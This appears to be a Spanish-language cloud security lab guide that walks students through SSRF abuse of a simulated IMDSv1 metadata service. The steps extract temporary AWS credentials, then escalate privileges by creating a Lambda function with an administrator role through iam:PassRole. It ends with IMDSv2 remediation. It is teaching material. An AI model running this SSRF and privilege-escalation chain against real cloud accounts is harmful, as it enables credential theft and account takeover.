# Laboratorio 1: Explotación del Plano de Identidad y Abuso de IMDSv1

* **Duración estimada:** 30 minutos.
* **Insumos iniciales:** Contenedor o VM simulada con una aplicación web vulnerable a SSRF y un servicio mock local en `169.254.169.254` que emula el servicio IMDSv1 de AWS/Azure/GCP.

## Objetivos de Aprendizaje

1. Explotar un vector SSRF para extraer credenciales temporales del servicio de metadatos de instancia bajo IMDSv1.
2. Encadenar permisos atómicos de IAM (`iam:PassRole` \+ `lambda:CreateFunction` o creación de políticas) para lograr escalada de privilegios en el plano de control.
3. Remediar la instancia forzando la transición a IMDSv2 con tokens orientados a sesión y límite de saltos.

## Marco teórico



## Guía Paso a Paso

### Paso 1: Extracción de credenciales temporales vía SSRF (IMDSv1)
* Crea una estructura de directorios en tu espacio de trabajo:

```bash 
mkdir -p cloud_ai_labs/recursos
cd cloud_ai_labs/recursos
# 2. Instalar dependencias requeridas (Flask y Requests)
pip install flask requests
```

* *Recurso Lab 1:* Emulador de Cómputo Vulnerable y Servicio IMDS (`imds_vulnerable_service.py`), este script en Flask emula de forma precisa el comportamiento del endpoint de metadatos `169.254.169.254` (soportando tanto el modo vulnerable IMDSv1 como el flujo orientado a sesión de IMDSv2) y sirve una aplicación web con una vulnerabilidad de SSRF en el puerto `8080`.
* Enviar una carga útil a la aplicación vulnerable para forzar una consulta `GET` no autenticada contra el servicio de metadatos local:

<img width="439" height="160" alt="image" src="https://github.com/user-attachments/assets/1ef49183-666a-4e3b-b5a1-8c9d401ba22a" />

 
```bash
# Consulta indirecta a través de la vulnerabilidad SSRF en la app web
curl -s "http://localhost:8080/preview?url=[payload a generar] "

```

### Paso 2: Extracción del material criptográfico temporal (STS Token)
Utiliza el rol obtenido de la consulta anterior para lograr extraer el material criptográfico que necesitas para suplantar la identidad de la virtual:

```bash
curl -s "http://localhost:8080/preview?url=http://localhost:8080/latest/meta-data/iam/security-credentials/ROL_OBTENIDO_CONSULTA_ANTERIOR"

```
El resultado que debes obtener es una impresión tipo JSON que tiene entre todos, los siguientes datos:

```
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
```

### Paso 3: Configuración de sesión y escalada de privilegios
Aprovechar que el rol cuenta con un permiso específico para asociar el rol administrativo existente (`AdministratorAccessRole`) a un servicio de cómputo serverless. Exportar las credenciales temporales y utiliza permisos preexistentes mal configurados para crear una función de ejecución con privilegios administrativos (Rol a identificar):

```bash
# En un enorno real, enumerar la propia identidad para verificar el contexto de ejecución se realizaría con estos comandos:
aws sts get-caller-identity

# Explotación de escalada: asociar un rol con privilegios elevados a una función
aws lambda create-function \
  --function-name BackdoorPrivEsc \
  --runtime python3.12 \
  --role arn:aws:iam::123456789012:role/AdministratorAccessRole \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://escalation_payload.zip
```

En nuestra simulación, obtendremos este escalada con un endpoint diseñado para eso, que cumple la misma función:

```bash
# Explotación de escalada: asociar un rol con privilegios elevados a una función

curl -s -X POST http://localhost:8080/admin/escalate_role -H "Content-Type: application/json" -d '{"role_arn":"DEFINICIÓN DEL ROL ARN, ESTO ES LA TAREA", "target_service":"lambda","payload_action":"CreateAdminUser"}'
```

### Paso 4: Remediación defensiva obligatoria (IMDSv2)
Para cerrar la brecha en la instancia y verificar la mitigación, se reconfigura el endpoint para forzar tokens de sesión e impedir peticiones directas:

```bash
# Forzar IMDSv2 y restringir saltos de red a 1 en un entorno real de AWS
aws ec2 modify-instance-metadata-options \
  --instance-id i-0abcdef1234567890 \
  --http-tokens required \
  --http-put-response-hop-limit 1 \
  --http-endpoint enabled
```
Para fines del laboratorio, el endpoint es el siguiente:
```
curl -s -X POST http://localhost:8080/admin/remediate_imds
```

####

## Verificación
*Comprobación:* Reintentar el `curl` del Paso 1 sin cabecera de sesión; el servicio debe retornar inmediatamente un código `401 Unauthorized`.

## **Entregable / Enlace con el Lab 2:**

```
python3 generate_lab1_telemetry.py
```
Archivo `audit_events.json` que contiene el volcado íntegro de registros de llamadas a la API generados durante esta actividad (CloudTrail / Azure Activity Logs simulados).
